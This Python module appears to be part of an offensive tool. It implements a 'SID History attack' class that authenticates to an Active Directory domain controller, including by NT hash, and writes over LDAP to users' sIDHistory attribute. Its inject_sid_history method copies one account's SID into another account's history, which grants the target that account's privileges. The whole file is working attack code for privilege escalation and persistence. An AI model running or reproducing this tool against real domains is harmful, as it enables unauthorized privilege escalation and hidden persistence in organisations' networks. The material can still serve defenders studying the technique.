"""
SID History Attack Implementation
Main attack class that orchestrates authentication and LDAP operations.
"""

import logging
from typing import Optional, List

from .auth import AuthenticationManager
from .ldap_operations import LDAPOperations
from .sid_utils import SIDConverter


class SIDHistoryAttack:
    """
    Main class for performing SID History attacks from a remote Linux host.
    """

    def __init__(self, dc_ip: str, domain: str, dc_hostname: Optional[str] = None):
        """
        Initialize the SID History attack tool.

        Args:
            dc_ip: IP address of the domain controller
            domain: Target domain name
            dc_hostname: Hostname of the DC (optional, for Kerberos/SSL)
        """
        self.dc_ip = dc_ip
        self.domain = domain
        self.dc_hostname = dc_hostname or dc_ip
        
        self.auth_manager = AuthenticationManager(dc_ip, domain, dc_hostname)
        self.connection = None
        self.ldap_ops = None
        self.base_dn = SIDConverter.domain_to_dn(domain)

        logging.info(f"Initialized SID History tool targeting {dc_ip} ({domain})")

    def authenticate(self, auth_method: str, **kwargs) -> bool:
        """
        Authenticate to the domain controller.

        Args:
            auth_method: Authentication method (ntlm, ntlm-hash, kerberos, certificate, simple)
            **kwargs: Authentication parameters (username, password, nt_hash, etc.)

        Returns:
            True if authentication successful, False otherwise
        """
        self.connection = self.auth_manager.get_connection(auth_method, **kwargs)
        
        if self.connection:
            self.ldap_ops = LDAPOperations(self.connection, self.base_dn)
            logging.info(f"Successfully authenticated to {self.dc_ip}")
            return True
        else:
            logging.error("Authentication failed")
            return False

    def disconnect(self):
        """
        Close the connection to the domain controller.
        """
        if self.connection:
            self.connection.unbind()
            logging.info("Disconnected from domain controller")
            self.connection = None
            self.ldap_ops = None

    def get_user_sid(self, sam_account_name: str) -> Optional[str]:
        """
        Retrieve the SID of a user by sAMAccountName.

        Args:
            sam_account_name: The sAMAccountName of the user

        Returns:
            SID as a string, or None if not found
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return None

        return self.ldap_ops.get_user_sid(sam_account_name)

    def get_current_sid_history(self, sam_account_name: str) -> List[str]:
        """
        Retrieve the current SID History of a user.

        Args:
            sam_account_name: The sAMAccountName of the user

        Returns:
            List of SIDs in the user's SID History
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return []

        return self.ldap_ops.get_sid_history(sam_account_name)

    def add_sid_to_history(self, target_user: str, sid_to_add: str) -> bool:
        """
        Add a SID to the SID History attribute of a target user.

        Args:
            target_user: sAMAccountName of the user to modify
            sid_to_add: SID to add to the user's SID History

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            current_history = self.ldap_ops.get_sid_history(target_user)
            
            if sid_to_add in current_history:
                logging.warning(f"SID {sid_to_add} already exists in SID History")
                return True

            current_history.append(sid_to_add)
            
            success = self.ldap_ops.modify_sid_history(user_dn, current_history)

            if success:
                logging.info(f"Successfully added SID {sid_to_add} to {target_user}'s SID History")
            
            return success

        except Exception as e:
            logging.error(f"Error adding SID to history: {e}")
            return False

    def inject_sid_history(self, target_user: str, source_user: str) -> bool:
        """
        Inject the SID of a source user into the SID History of a target user.

        Args:
            target_user: sAMAccountName of the user to modify
            source_user: sAMAccountName of the user whose SID to inject

        Returns:
            True if successful, False otherwise
        """
        logging.info(f"Injecting SID from {source_user} into {target_user}")

        source_sid = self.get_user_sid(source_user)
        if not source_sid:
            logging.error(f"Could not retrieve SID for source user {source_user}")
            return False

        return self.add_sid_to_history(target_user, source_sid)

    def remove_sid_from_history(self, target_user: str, sid_to_remove: str) -> bool:
        """
        Remove a specific SID from a user's SID History.

        Args:
            target_user: sAMAccountName of the user to modify
            sid_to_remove: SID to remove from the user's SID History

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            current_history = self.ldap_ops.get_sid_history(target_user)
            
            if sid_to_remove not in current_history:
                logging.warning(f"SID {sid_to_remove} not found in SID History")
                return True

            current_history.remove(sid_to_remove)
            
            success = self.ldap_ops.modify_sid_history(user_dn, current_history)

            if success:
                logging.info(f"Successfully removed SID {sid_to_remove} from {target_user}'s SID History")
            
            return success

        except Exception as e:
            logging.error(f"Error removing SID from history: {e}")
            return False

    def clear_sid_history(self, target_user: str) -> bool:
        """
        Clear all SID History entries for a user.

        Args:
            target_user: sAMAccountName of the user to modify

        Returns:
            True if successful, False otherwise
        """
        if not self.ldap_ops:
            logging.error("Not connected to domain controller")
            return False

        try:
            user_dn = self.ldap_ops.get_user_dn(target_user)
            if not user_dn:
                return False

            success = self.ldap_ops.modify_sid_history(user_dn, [])

            if success:
                logging.info(f"Successfully cleared SID History for {target_user}")
            
            return success

        except Exception as e:
            logging.error(f"Error clearing SID History: {e}")
            return False

